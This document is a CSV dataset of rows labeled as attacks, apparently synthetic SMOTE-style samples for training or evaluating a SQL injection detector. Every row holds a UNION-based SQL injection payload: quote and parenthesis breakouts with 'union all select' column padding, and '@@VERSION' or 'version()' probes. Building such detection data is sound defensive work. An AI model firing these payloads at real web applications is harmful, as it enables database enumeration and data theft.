id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001689,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,0.662250000515067
SMOTE_001690,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,0.9996878214954285
SMOTE_001691,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.7426864483560764
SMOTE_001692,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.7943528656696158
SMOTE_001693,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.2331249606827188
SMOTE_001694,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,0.5884914308571124
SMOTE_001695,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,1.4793393014159457
SMOTE_001696,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,2.3009908068223988
SMOTE_001697,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.9962835905065529
SMOTE_001698,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,1.3784179981619076
SMOTE_001699,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.04879988130755651
SMOTE_001700,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,2.5456596720916815
SMOTE_001701,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,1.3670388693163267
SMOTE_001702,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.434040411187649
SMOTE_001703,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,2.0156890921519497
SMOTE_001704,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,1.555327880517374
SMOTE_001705,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.7984182054318885
SMOTE_001706,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.072542120537655
SMOTE_001707,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,2.421206110768581
SMOTE_001708,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.2346034606942686
SMOTE_001709,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.8801392952464291
SMOTE_001710,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.34946935945278323
SMOTE_001711,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.7255257192288248
SMOTE_001712,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,1.2467780031594209
SMOTE_001713,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.03935744363596523
SMOTE_001714,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.2426702157033003
SMOTE_001715,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,2.543070565984622
SMOTE_001716,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.0508879439235974
SMOTE_001717,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,2.0456928374114707
SMOTE_001718,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,0.6404893851028935
SMOTE_001719,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.0389475409967635
SMOTE_001720,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,0.025221163104954102
SMOTE_001721,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,2.3090034998718445
SMOTE_001722,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,1.8071837028239566
SMOTE_001723,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.1272092964508721
SMOTE_001724,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,2.3761949087248926
SMOTE_001725,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.083142151790946
SMOTE_001726,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.5746095202778446
SMOTE_001727,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.9486609672936728
SMOTE_001728,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,0.6968482269002938
SMOTE_001729,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,1.4122670909324795
SMOTE_001730,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,0.18512995942274824
SMOTE_001731,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,0.02551736727946564
SMOTE_001732,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.756318838769097
SMOTE_001733,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.6840765158216396
SMOTE_001734,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,0.1277926004623592
SMOTE_001735,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.5448909706949157
SMOTE_001736,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.8381872744251592
SMOTE_001737,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.3287333101019512
SMOTE_001738,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,1.0716711110376462
SMOTE_001739,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.06824029112545581
SMOTE_001740,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.8095360152886062
SMOTE_001741,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.0536207000903666
SMOTE_001742,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,0.3778413854066782
SMOTE_001743,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.17337083326577102
SMOTE_001744,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,2.128264465169854
SMOTE_001745,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,1.9070695677540077
SMOTE_001746,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.9685696678623995
SMOTE_001747,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.3657272158819841
SMOTE_001748,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.221229286010524
SMOTE_001749,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.8244698134433783
SMOTE_001750,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,2.0537658674741466
SMOTE_001751,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.190796950838096
SMOTE_001752,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,0.4361282784126488
SMOTE_001753,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.253196801662973
SMOTE_001754,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,0.1858005676438308
SMOTE_001755,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,1.5875745666945906
SMOTE_001756,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.00408753663826212
SMOTE_001757,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.0866471059347986
SMOTE_001758,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.0845787555596063
SMOTE_001759,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,1.1245668413292358
SMOTE_001760,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,0.6270232744405514
SMOTE_001761,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.7403345601776886
SMOTE_001762,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,0.7263954355578673
SMOTE_001763,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,2.340206203015058
SMOTE_001764,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,1.4629498874609754
SMOTE_001765,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.09368800486610522
SMOTE_001766,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,2.384807898827003
SMOTE_001767,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,1.7042177873844742
SMOTE_001768,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.300750829741867
SMOTE_001769,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,1.2542748946878943
SMOTE_001770,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,1.8540380482941974
SMOTE_001771,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,2.008673620850362
SMOTE_001772,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,0.11553282422338074
SMOTE_001773,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,1.6238824922452506
SMOTE_001774,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.30270338781946093
SMOTE_001775,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.6683312404349124
SMOTE_001776,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.7191515821314338
SMOTE_001777,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.5307303897731966
SMOTE_001778,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,0.3629031886603585
SMOTE_001779,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.6532595814951152
SMOTE_001780,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,0.5001355499564173
SMOTE_001781,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,1.1171032717780192
SMOTE_001782,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.294632433145276
SMOTE_001783,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,0.45103104102184277
SMOTE_001784,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,1.2868858032034147
SMOTE_001785,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000019,1.7208478173744874
SMOTE_001786,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.5832065820321326
SMOTE_001787,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.098970739808436
SMOTE_001788,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,0.6970261203562427
SMOTE_001789,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.9104619494760178
SMOTE_001790,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,2.7068560520344684
SMOTE_001791,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,1.182356372387488
